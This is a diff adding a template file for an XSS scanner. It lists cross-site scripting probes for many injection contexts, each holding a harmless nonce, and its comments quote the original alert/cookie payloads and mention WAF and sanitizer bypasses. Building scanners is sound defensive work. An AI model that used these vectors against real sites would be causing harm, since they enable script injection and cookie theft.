@@ -1,0 +1,48 @@
+# XSS Nonce Templates
+# Format: template|context|severity
+# Use %NONCE% as placeholder — replaced with a random hex string per scan.
+# Add new templates below to expand injection context coverage without code changes.
+# Source: Hacking-Payloads (github.com/capture0x/Hacking-payloads)
+#         Ethical hacking / penetration testing collection.
+#
+# ── Original 4 contexts ──────────────────────────────────────────────────────
+<script>/*%NONCE%*/</script>|html_body|High
+"><img src=x onerror=/*%NONCE%*/>|html_attr|High
+';/*%NONCE%*/|js_context|Medium
+va-%NONCE%-probe|reflection|Medium
+#
+# ── Added: Round 1 (from Hacking-payloads xss.txt) ───────────────────────────
+# Source: "><svg onload=alert(1)>
+"><svg onload=/*%NONCE%*/>|svg_onload|High
+# Source: <input onfocus=alert(1) autofocus tabindex=1>
+<input onfocus=/*%NONCE%*/ autofocus>|autofocus_onfocus|High
+# Source: <details/open/ontoggle=confirm('XSS')>
+<details open ontoggle=/*%NONCE%*/>|html5_ontoggle|High
+# Source: <img onmouseover=alert(document.domain)>
+<img src=x onmouseover=/*%NONCE%*/>|mouse_event|Medium
+#
+# ── Added: Round 2 (deeper analysis of Hacking-payloads xss.txt) ─────────────
+# Source: </script><script>alert(9)</script>  — break out of existing <script> block
+</script><script>/*%NONCE%*/</script>|script_breakout|High
+# Source: <!</textarea <body onload='alert(1)'>  — document-level body event
+<body onload=/*%NONCE%*/>|body_event|High
+# Source: '}};alert(1);{{'  — JSON object / template literal breakout
+'}];/*%NONCE%*/;//|json_breakout|Medium
+# Source: <IFRAME SRC="javascript:alert(document.cookie);">  — javascript: URL in src/href
+<iframe src="javascript:/*%NONCE%*/">|js_url|High
+# Source: <svg onPointerEnter="location=`...`">  — pointer event (bypasses some WAFs)
+<svg onpointerenter=/*%NONCE%*/>|pointer_event|Medium
+# Source: <video onloadstart=alert()><source>  — video element event
+<video src=x onloadstart=/*%NONCE%*/>|video_event|Medium
+#
+# ── Added: Round 3 (CyberDepot / infosec-db.github.io) ───────────────────────
+# Source: <a href="#" onclick="alert('XSS')">  — anchor onclick (missed by many sanitizers)
+<a href="#" onclick=/*%NONCE%*/>x</a>|anchor_onclick|High
+# Source: <svg><script>alert(1)</script></svg>  — script inside SVG namespace
+<svg><script>/*%NONCE%*/</script></svg>|svg_script|High
+# Source: <svg><a xlink:href="javascript:alert(1)">  — SVG xlink namespace bypass
+<svg><a xlink:href="javascript:/*%NONCE%*/">x</a></svg>|svg_xlink|High
+# Source: <marquee width=1 loop=1 onfinish=confirm(1)>  — marquee event (legacy HTML)
+<marquee onfinish=/*%NONCE%*/>x</marquee>|marquee_event|Medium
+# Source: <object data="data:text/html;...">  — object element data attribute
+<object data="javascript:/*%NONCE%*/">x</object>|object_data|High
